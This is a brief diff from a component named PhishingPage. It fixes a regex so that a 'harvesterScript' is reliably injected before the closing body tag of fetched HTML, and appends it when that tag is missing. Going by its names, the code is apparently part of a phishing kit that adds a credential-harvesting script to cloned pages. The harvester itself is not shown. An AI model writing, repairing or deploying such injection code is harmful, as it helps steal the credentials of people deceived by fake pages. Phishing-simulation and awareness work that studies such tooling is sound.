@@ -202,7 +202,7 @@ export default function PhishingPage() {
       }
 
       if (html.includes('</body>')) {
-        html = html.replace(/<\\/body>/i, `${harvesterScript}</body>`);
+        html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
       } else {
         html += harvesterScript;
       }
